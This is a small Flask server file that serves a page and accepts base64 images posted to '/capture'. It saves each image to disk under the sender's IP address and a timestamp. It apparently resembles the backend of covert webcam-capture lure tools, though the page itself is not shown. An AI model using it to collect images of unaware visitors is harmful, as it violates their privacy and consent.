from flask import Flask, render_template, request, jsonify
import os, base64, datetime

app = Flask(__name__)
os.makedirs('captures', exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        img_data = data['image'].split(',')[1]
        ip = request.remote_addr
        ts = datetime.datetime.now().isoformat()
        filename = f"captures/{ip}_{ts.replace(':', '-')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(img_data))
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
